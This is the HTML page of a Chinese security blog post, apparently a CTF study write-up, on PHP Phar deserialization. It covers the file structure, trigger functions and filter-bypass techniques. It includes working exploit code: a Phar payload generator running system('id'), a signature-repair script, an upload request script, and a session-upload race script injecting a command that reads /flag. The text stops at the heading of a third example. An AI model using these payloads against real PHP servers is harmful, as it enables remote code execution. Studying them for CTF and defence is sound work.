@@ -1,0 +1,747 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://ether-lin.cn';window.REIMU_CONFIG.relative = '/';</script>
+  <title>
+    Phar反序列化 | 旧书页间，夹着半叶梧桐
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="一、 核心原理  1. Phar 文件的“四段式”结构 Phar (Php ARchive) 类似 Java 的 JAR 包，其文件结构由四部分组成：    结构 作用 攻击面     Stub 文件头标识，格式必须为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; 伪造文件头（如 GIF89a）绕过检测   Manifest 存储压缩文件属性、权限及 Meta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phar反序列化">
+<meta property="og:url" content="http://ether-lin.cn/2026/08/09/Phar/index.html">
+<meta property="og:site_name" content="旧书页间，夹着半叶梧桐">
+<meta property="og:description" content="一、 核心原理  1. Phar 文件的“四段式”结构 Phar (Php ARchive) 类似 Java 的 JAR 包，其文件结构由四部分组成：    结构 作用 攻击面     Stub 文件头标识，格式必须为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; 伪造文件头（如 GIF89a）绕过检测   Manifest 存储压缩文件属性、权限及 Meta">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-09T03:29:49.000Z">
+<meta property="article:modified_time" content="2026-08-09T07:27:09.474Z">
+<meta property="article:author" content="Ether">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+      <meta name="keywords" content="网络安全学习,成长,思考">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">焦虑是自由的眩晕...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/archives">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/about">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/friends">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/covers/10.jpg" alt="Phar反序列化">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">Phar反序列化</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text"> 一、 核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-phar-%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9B%E6%AE%B5%E5%BC%8F%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text"> 1. Phar 文件的“四段式”结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BA%90%E7%A0%81%E7%BA%A7%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text"> 2. 源码级触发机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%AF%E8%A7%A6%E5%8F%91-phar-%E7%9A%84%E5%87%BD%E6%95%B0%E6%B8%85%E5%8D%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 3. 可触发 Phar 的函数清单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-phar-%E7%9A%84%E7%94%9F%E6%88%90-%E4%BF%AE%E6%94%B9%E4%B8%8E%E7%BB%95%E8%BF%87%E4%BD%93%E7%B3%BB"><span class="toc-number">2.</span> <span class="toc-text"> 二、Phar 的生成、修改与绕过体系</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%94%9F%E6%88%90%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.1.</span> <span class="toc-text"> 1. 基础生成模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-waf-%E7%BB%95%E8%BF%87%E4%BD%93%E7%B3%BB%E5%8C%96%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text"> 2. WAF 绕过体系化总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">3.</span> <span class="toc-text"> 三、 实战演练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80unserialize-again-%E5%9F%BA%E7%A1%80-phar-%E7%AD%BE%E5%90%8D%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.1.</span> <span class="toc-text"> 例题一：Unserialize Again (基础 Phar + 签名修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%BA%8Cez-to-getflag-zip-%E5%8E%8B%E7%BC%A9-session-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">3.2.</span> <span class="toc-text"> 例题二：Ez to getflag (Zip 压缩 + Session 条件竞争)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%89%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-%E7%BA%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6c-%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%B0%84-rce"><span class="toc-number">3.3.</span> <span class="toc-text"> 例题三：君の名は (纯反序列化进阶：C: 协议与反射 RCE)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-%E6%80%BB%E7%BB%93pop-%E9%93%BE%E7%BB%88%E7%82%B9%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">4.</span> <span class="toc-text"> 四、 总结：POP 链终点速查表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text"> 五、参考文章</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Phar" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-09T03:29:49.000Z" itemprop="datePublished">2026-08-09</time>
+    <time style="display: none;" id="post-update-time">2026-08-09</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="一-核心原理"><a class="markdownIt-Anchor" href="#一-核心原理"></a> 一、 核心原理</h1>
+<h2 id="1-phar-文件的四段式结构"><a class="markdownIt-Anchor" href="#1-phar-文件的四段式结构"></a> 1. Phar 文件的“四段式”结构</h2>
+<p>Phar (Php ARchive) 类似 Java 的 JAR 包，其文件结构由四部分组成：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">结构</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">攻击面</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>Stub</strong></td>
+<td style="text-align:left">文件头标识，格式必须为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></td>
+<td style="text-align:left">伪造文件头（如 <code>GIF89a</code>）绕过检测</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Manifest</strong></td>
+<td style="text-align:left">存储压缩文件属性、权限及 <strong>Meta-data</strong></td>
+<td style="text-align:left"><strong>核心攻击点</strong>：Meta-data 以<strong>序列化形式</strong>存储</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Contents</strong></td>
+<td style="text-align:left">压缩文件的实际内容</td>
+<td style="text-align:left">一般不涉及</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Signature</strong></td>
+<td style="text-align:left">文件末尾的签名（MD5/SHA1/SHA256/SHA512）</td>
+<td style="text-align:left">修改 Meta-data 后必须<strong>重算签名</strong></td>
+</tr>
+</tbody>
+</table>
+<p>注：签证尾部的<code>01</code>代表<code>MD5加密</code>，<code>02</code>代表<code>SHA1加密</code>，<code>04</code>代表<code>SHA256加密</code>，<code>08</code>代表<code>SHA512加密</code></p>
+<h2 id="2-源码级触发机制"><a class="markdownIt-Anchor" href="#2-源码级触发机制"></a> 2. 源码级触发机制</h2>
+<p>Phar 之所以能反序列化，是因为 PHP 底层在解析 Phar 文件的 Manifest 时，会调用 <code>phar_parse_metadata()</code>，该函数内部直接调用了 <code>php_var_unserialize()</code>。</p>
+<p><strong>完整调用链：</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;phar://xxx.phar/test.txt&quot;)</span><br><span class="line">  → php_stream_open_wrapper()</span><br><span class="line">    → phar_stream_open()</span><br><span class="line">      → phar_parse_metadata()      // 解析 manifest</span><br><span class="line">        → php_var_unserialize()    // 💥触发反序列化！</span><br></pre></td></tr></table></figure>
+<h2 id="3-可触发-phar-的函数清单"><a class="markdownIt-Anchor" href="#3-可触发-phar-的函数清单"></a> 3. 可触发 Phar 的函数清单</h2>
+<p>只要函数底层调用了 <code>php_stream_open</code> 或 <code>stat</code> 系列函数，且参数可控，即可触发：</p>
+<ul>
+<li><strong>读取类</strong>：<code>file_get_contents</code>, <code>fopen</code>, <code>readfile</code>, <code>fgets</code></li>
+<li><strong>信息类</strong>：<code>file_exists</code>, <code>is_file</code>, <code>is_dir</code>, <code>filesize</code>, <code>stat</code>, <code>filemtime</code></li>
+<li><strong>写入类</strong>：<code>file_put_contents</code>, <code>copy</code>, <code>move_uploaded_file</code></li>
+<li><strong>其他</strong>：<code>getimagesize</code>, <code>md5_file</code>, <code>sha1_file</code></li>
+</ul>
+<hr />
+<h1 id="二-phar-的生成-修改与绕过体系"><a class="markdownIt-Anchor" href="#二-phar-的生成-修改与绕过体系"></a> 二、Phar 的生成、修改与绕过体系</h1>
+<h2 id="1-基础生成模板"><a class="markdownIt-Anchor" href="#1-基础生成模板"></a> 1. 基础生成模板</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;id&#x27;);&quot;</span>; &#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 必须包含此 Stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Payload</span>());             <span class="comment">// 注入恶意对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>(注：生成时需确保 <code>php.ini</code> 中 <code>phar.readonly = Off</code>)</em></p>
+<h2 id="2-waf-绕过体系化总结"><a class="markdownIt-Anchor" href="#2-waf-绕过体系化总结"></a> 2. WAF 绕过体系化总结</h2>
+<p>当 WAF 或代码对上传和读取进行限制时，我们需要以下“武器”进行绕过：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">限制类型</th>
+<th style="text-align:left">绕过姿势</th>
+<th style="text-align:left">原理说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>后缀检测</strong></td>
+<td style="text-align:left">改后缀为 <code>.jpg/.png/.txt</code></td>
+<td style="text-align:left">PHP 识别 Phar 靠 Stub，不靠后缀</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>文件头检测</strong></td>
+<td style="text-align:left">修改 Stub：<code>GIF89a&lt;?php __HALT...</code></td>
+<td style="text-align:left">伪造为图片文件头</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>__HALT_COMPILER</code> 关键字检测</strong></td>
+<td style="text-align:left"><strong>Gzip / Bzip2 压缩</strong></td>
+<td style="text-align:left">压缩后关键字消失，利用 <code>phar://shell.gz/test.txt</code> 解析</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>phar://</code> 协议过滤</strong></td>
+<td style="text-align:left"><strong>协议嵌套</strong></td>
+<td style="text-align:left"><code>compress.zlib://phar://shell.phar/test.txt</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>__wakeup</code> 属性覆盖</strong></td>
+<td style="text-align:left"><strong>修改序列化属性个数</strong></td>
+<td style="text-align:left">用 010 Editor 将 <code>O:1:&quot;A&quot;:1:&#123;</code> 改为 <code>O:1:&quot;A&quot;:2:&#123;</code> (CVE-2016-7124)</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>修改文件后签名失效</strong></td>
+<td style="text-align:left"><strong>Python 重算签名</strong></td>
+<td style="text-align:left">提取正文，计算 SHA1/SHA256，拼接 GBMB 标识</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="三-实战演练"><a class="markdownIt-Anchor" href="#三-实战演练"></a> 三、 实战演练</h1>
+<h2 id="例题一unserialize-again-基础-phar-签名修复"><a class="markdownIt-Anchor" href="#例题一unserialize-again-基础-phar-签名修复"></a> 例题一：<a href="https://ether-lin.cn/2026/08/02/2026-7-27-8-2/#unserialize-again">Unserialize Again</a> (基础 Phar + 签名修复)</h2>
+<blockquote>
+<p><strong>考点</strong>：<code>php://input</code> 写入、<code>__wakeup</code> 绕过、SHA256 签名修复</p>
+</blockquote>
+<p><strong>1. 漏洞链路分析</strong><br />
+题目提供了 <code>file_put_contents($pear, urldecode(php://input))</code> 用于写入文件，以及 <code>file_exists($Adam)</code> 用于触发。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST body (php://input) -&gt; 写入 hacker.phar</span><br><span class="line">GET apple=phar://hacker.phar -&gt; file_exists() 触发反序列化</span><br><span class="line">-&gt; story::__destruct() (God=true &amp;&amp; user=admin) -&gt; system($eating)</span><br></pre></td></tr></table></figure>
+<p><strong>2. 核心难点：绕过 <code>__wakeup</code> 与签名修复</strong><br />
+<code>story</code> 类的 <code>__wakeup</code> 中有 <code>die()</code>，必须修改属性个数绕过。但修改 010 Editor 中的字节后，Phar 签名会损坏。<br />
+通过 010 Editor 观察文件末尾 <code>00</code> 前的 <code>03</code>，得知本题使用 <strong>SHA256</strong> 签名（32字节）。</p>
+<p><strong>修复脚本（实战利器）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hacker.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="comment"># phar 签名结构: 正文 + SHA256(32字节) + 标志位(8字节)</span></span><br><span class="line">main = data[:-<span class="number">40</span>] </span><br><span class="line">end = data[-<span class="number">8</span>:]</span><br><span class="line">new_sign = sha256(main).digest()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hacker_fixed.phar&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(main + new_sign + end)</span><br></pre></td></tr></table></figure>
+<p><strong>3. 最终 Exploit</strong><br />
+由于浏览器直接上传二进制 phar 容易损坏，使用 Python 发送请求并进行 URL 编码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, urllib.parse</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hacker_fixed.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    phar_data = urllib.parse.quote(f.read())</span><br><span class="line">params = &#123;<span class="string">&quot;pear&quot;</span>: <span class="string">&quot;hacker.phar&quot;</span>, <span class="string">&quot;apple&quot;</span>: <span class="string">&quot;phar://hacker.phar&quot;</span>&#125;</span><br><span class="line">requests.post(url, params=params, data=phar_data)</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="例题二ez-to-getflag-zip-压缩-session-条件竞争"><a class="markdownIt-Anchor" href="#例题二ez-to-getflag-zip-压缩-session-条件竞争"></a> 例题二：<a href="https://ether-lin.cn/2026/08/02/2026-7-27-8-2/#ez-to-getflag">Ez to getflag</a> (Zip 压缩 + Session 条件竞争)</h2>
+<blockquote>
+<p><strong>考点</strong>：文件内容过滤绕过、Zip 压缩 Phar、Session Upload Progress 条件竞争</p>
+</blockquote>
+<p><strong>1. 漏洞链路分析 (POP Chain)</strong><br />
+本题的难点在于 POP 链的构造和文件包含的利用：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Test::__destruct() -&gt; echo $this-&gt;str (str=Upload)</span><br><span class="line">  -&gt; Upload::__toString() -&gt; echo $cont-&gt;$size (cont=Show, size=&#x27;tmp/sess_dre0&#x27;)</span><br><span class="line">    -&gt; Show::__get() -&gt; $this-&gt;ok() (方法不存在)</span><br><span class="line">      -&gt; Show::__call() -&gt; $this-&gt;backdoor(&#x27;tmp/sess_dre0&#x27;)</span><br><span class="line">        -&gt; include(&#x27;tmp/sess_dre0&#x27;) 💥 文件包含！</span><br></pre></td></tr></table></figure>
+<p><strong>2. 核心难点：绕过内容过滤与文件包含</strong></p>
+<ul>
+<li><strong>绕过上传过滤</strong>：代码使用 <code>preg_match</code> 过滤了 <code>&lt;?php</code>、<code>system</code> 等关键字。我们将生成的 <code>shell.phar</code> 使用 <strong>Zip 格式压缩</strong>，并改名为 <code>shell.png</code> 上传。Zip 压缩可以完美破坏 Phar 的文本特征，且 <code>phar://</code> 协议原生支持解析 Zip 格式的 Phar。</li>
+<li><strong>实现 RCE (条件竞争)</strong>：<code>include</code> 包含的是 Session 临时文件。我们利用 PHP 的 <strong>Session Upload Progress</strong> 机制，在上传文件时通过 POST 传入 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 字段，将恶意代码写入 <code>/tmp/sess_dre0</code>。由于 PHP 会在请求结束后清理 Session 文件，必须使用<strong>多线程条件竞争</strong>。</li>
+</ul>
+<p><strong>3. 竞争脚本核心逻辑</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 线程1：疯狂上传文件，利用 Session 机制写入临时文件 /tmp/sess_dre0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sess_upload</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dre0.png&#x27;</span>, <span class="string">b&#x27;cha&#x27;</span>*<span class="number">300</span>)&#125;</span><br><span class="line">    requests.post(upload_url, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;dre0&#x27;</span>&#125;, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程2：疯狂触发 Phar 反序列化，去 include 这个临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include_phar</span>():</span><br><span class="line">    params = &#123;<span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;phar://upload/shell.png&#x27;</span>&#125; <span class="comment"># 触发 POP 链</span></span><br><span class="line">    res = requests.get(file_url, params=params)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;DASCTF&quot;</span> <span class="keyword">in</span> res.text: <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="例题三君の名は-纯反序列化进阶c-协议与反射-rce"><a class="markdownIt-Anchor" href="#例题三君の名は-纯反序列化进阶c-协议与反射-rce"></a> 例题三：<a href="https://ether-lin.cn/2026/05/29/LitCTF2025/#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF">君の名は</a> (纯反序列化进阶：C: 协议与反射 RCE)</h2>
+<blockquote>
